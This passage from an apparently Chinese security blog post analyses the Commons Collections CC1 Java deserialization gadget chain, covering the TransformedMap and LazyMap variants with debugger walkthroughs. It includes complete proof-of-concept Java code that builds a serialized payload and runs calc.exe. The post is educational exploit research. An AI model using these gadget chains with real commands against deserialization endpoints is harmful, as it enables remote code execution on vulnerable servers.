alt="image.png"></p><p>程序已经成功走到断点处</p><p><img src="/assets/image-20230501144240-lwvoopq.png" alt="image.png"></p><p>一步一步走一下看看，首先拿到我们的反序列化流</p><p><img src="/assets/image-20230501144419-fg900h3.png" alt="image.png"></p><p>这里获取传过来的注解</p><p><img src="/assets/image-20230501144730-1v8b2jv.png" alt="image.png"></p><p>遍历var4里面的元素赋值给var5，而var4是this.memberValues.entrySet().iterator()获取的迭代器，this.memberValues其实就是我们反射构造器里传进来的outerMap</p><p><img src="/assets/image-20230501145027-jn3v740.png" alt="image.png"></p><p>那最后直接条跳到最后一个断点</p><p><img src="/assets/image-20230501145404-tqtaae8.png" alt="image.png"></p><p><img src="/assets/image-20230501145918-556mqeg.png" alt="image.png"></p><p>跟进这个对象的setValue方法</p><p><img src="/assets/image-20230501150820-tg9itty.png" alt="image.png"></p><p>调用了this.parent.checkSetValue，而这里this.parent就是我们熟悉的TransformedMap，再往里面跟一步</p><p><img src="/assets/image-20230501151008-ky9mboi.png" alt="image.png"></p><p>transform回调就在这里被执行了，直接让程序走到最后，发现执行命令成功弹出了计算机</p><p><img src="/assets/image-20230501151138-zpddhlx.png" alt="image.png"></p><p>链子是通了，但是为什么要用如下的方式去构造POC呢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,</span><br><span class="line">                Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                    <span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">            transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">            Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">            Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)</span><br><span class="line">            construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比最终的反序列化POC和最初的如下一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现最大的区别就是获取Runtime这个对象的方式不同了</p><p>最初获取方式如下</p><p><img src="/assets/image-20230501151958-rblx5ue.png" alt="image.png"></p><p>最终POC获取方式如下</p><p><img src="/assets/image-20230501152041-ip7t18o.png" alt="image.png"></p><p>这是因为Runtime这个类是没有实现Serializable接口的，直接通过最初的Runtime.getRuntime()方式获取对象，在序列化过程中会报错，导致得不到流。</p><p>还一个问题为什么用Retention.class注解</p><p><img src="/assets/image-20230501152721-vczu7z7.png" alt="image.png"></p><p>这是因为AnnotationInvocationHandler里逻辑里有个如下判断</p><p><img src="/assets/image-20230501152927-n3afm7m.png" alt="image.png"></p><p>而让程序这个if条件为真的条件就是</p><blockquote><ol><li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是<br> Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</li><li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</li></ol></blockquote><p>这也是为什么使用Retention的原因</p><p><img src="/assets/image-20230501153111-st2uims.png" alt="image.png"></p><p>当然这种注解不止是Retention，也可以用其他满足条件的注解替换。</p><h1 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h1><p>LazyMap这个类也是ysoserial这款工具里CC1使用的类，LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承AbstractMapDecorator。</p><p>先上POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Object.class,</span><br><span class="line">                Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">            &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">            <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">            Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">            Map.class);</span><br><span class="line"></span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)</span><br><span class="line">            construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)</span><br><span class="line">            Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler)</span><br><span class="line">            construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">            <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第一处与TransformedMap利用链不同的地方就是在42行使用了LazyMap.decorate方法，跟进看看</p><p><img src="/assets/image-20230502104702-s8tgwr1.png" alt="image.png"></p><p>把我们构造好的transformerChain，传递给了factory，那怎么让它去调用factory里的回调函数transform呢，这要看LazyMap里的get方法了。</p><p><img src="/assets/image-20230502104916-g2diikv.png" alt="image.png"></p><p>里面的逻辑是当get过来的值找不到时，就会调用factory.transform，所以我们还是要去寻找一个类，这个类里存在调用get这个方法。当然LazyMap这条链还是利用了sun.reflect.annotation.AnnotationInvocationHandler，但是AnnotationInvocationHandler这个类的readObject方法里面没有直接去调用get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是AnnotationInvocationHandler这个类是实现了InvocationHandler这个接口的，且AnnotationInvocationHandler类的invoke方法里面是有调用get这个方法的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">var7</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span>(var4.hashCode()) &#123;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1776922004</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">147696667</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1444986633</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230502110518-ol7cqdp.png" alt="image.png"></p><p>所以ysoserial的作者就想到了通过对象代理的方法去调用到这个get，这也是我们在POC的52-57行中看到的第二处与TransformedMap不同的地方。</p><p>运行POC也是可以成功执行命令的</p><p><img src="/assets/image-20230502111639-lmpw1qk.png" alt="image.png"></p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><blockquote><p><a href="https://t.zsxq.com/ZNZrJMZ">https://t.zsxq.com/ZNZrJMZ</a>    &#x2F;&#x2F;p牛java安全漫谈系列</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何打造自己的burpsuite自动化武器库</title>
      <link href="/2023/05/02/%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84burpsuite%E8%87%AA%E5%8A%A8%E5%8C%96%E6%AD%A6%E5%99%A8%E5%BA%93/"/>
      <url>/2023/05/02/%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84burpsuite%E8%87%AA%E5%8A%A8%E5%8C%96%E6%AD%A6%E5%99%A8%E5%BA%93/</url>
      
